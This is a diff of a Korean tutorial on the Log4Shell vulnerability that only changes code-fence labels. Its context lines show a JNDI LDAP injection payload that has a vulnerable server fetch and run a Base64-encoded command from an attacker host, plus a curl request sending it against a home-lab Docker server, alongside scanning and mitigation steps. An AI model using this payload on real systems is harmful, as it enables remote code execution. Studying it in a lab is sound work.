@@ -224,7 +224,7 @@ docker를 통해 가상환경에 구동 했습니다. 로컬에서 취약점을 
 
 이번에 사용할 공격 코드 형식은 아래와 같습니다.
 
-```zsh
+```bash
 ${jndi:ldap://공격아이피:1389/Basic/Command/Base64/실행할 명령을 Base64로 인코딩한 메시지}
 ```
 
@@ -232,7 +232,7 @@ ${jndi:ldap://공격아이피:1389/Basic/Command/Base64/실행할 명령을 Base
 
 base64 인코더는 따로 준비 할 필요 없이 Terminal에서 아래의 명령으로 간단하게 이용 할 수 있습니다.
 
-```zsh
+```bash
  echo -n 'touch /tmp/shane' | base64
 ```
 
@@ -240,7 +240,7 @@ base64 인코더는 따로 준비 할 필요 없이 Terminal에서 아래의 명
 
 공격 코드가 정해 졌습니다. 즉각 해당코드를 실행 하도록 취약 서버에 요청을 보내 보겠습니다.
 
-```zsh
+```bash
 curl 192.168.0.32:9999 -H 'X-Api-Version: ${jndi:ldap://공격ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9zaGFuZQ==}'
 ```
 
@@ -296,7 +296,7 @@ curl 192.168.0.32:9999 -H 'X-Api-Version: ${jndi:ldap://공격ip:1389/Basic/Comm
 
 1. 저장소 clone
 
-```zsh
+```bash
 git clone https://github.com/fullhunt/log4j-scan.git
 ```
 
@@ -304,7 +304,7 @@ git clone https://github.com/fullhunt/log4j-scan.git
 
 2. 의존성 다운로드
 
-```zsh
+```bash
 pip3 install -r requirements.txt
 ```
 
@@ -312,7 +312,7 @@ pip3 install -r requirements.txt
 
 3. 실행 
 
-```zsh
+```bash
 python3 log4j-scan.py -u "확인할 URL 주소"
 ```
 
@@ -322,7 +322,7 @@ python3 log4j-scan.py -u "확인할 URL 주소"
 
 이번에는 취약점이 있는 서버를 대상으로 시도 해 보겠습니다. 저희 집 내부망에 있는 다른 컴퓨터에 9999포트를 바인딩 한 도커 컨테이너를 하나 띄워 취약한 웹 어플리케이션을 띄운 다음 해당 URL을 대상으로 스캔 해 보았습니다. 그 결과는 어떨까요?
 
-```zsh
+```bash
 python3 log4j-scan.py -u "http://192.168.0.32:9999"
 ```
 
@@ -345,7 +345,7 @@ python3 log4j-scan.py -u "http://192.168.0.32:9999"
 2. log4j 2.7.0 이상 사용시에는 log4.xml 등의 설정에 PatternLayout 속성에 있는 %m 부분을 `%m{nolookups}`로 교체합니다.
 3. log4의 버전이 그 이하일 경우에는 대처하기가 좀 더 까다롭습니다. 아래의 명령어로 log4j-core 에서 JndiLookUp에 관련된 모든 파일을 재귀적으로 제거 해 줍니다. 하지만  zip 커맨드가 닿지 못하는 위치에 JndiLookup 클래스가 내장되었을 경우에는 대응이 불가능 하기 때문에 최후의 수단으로만 사용 되며 권장되지 않습니다.
 
-```zsh
+```bash
 find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/JndiLookup.class \;
 
 ```
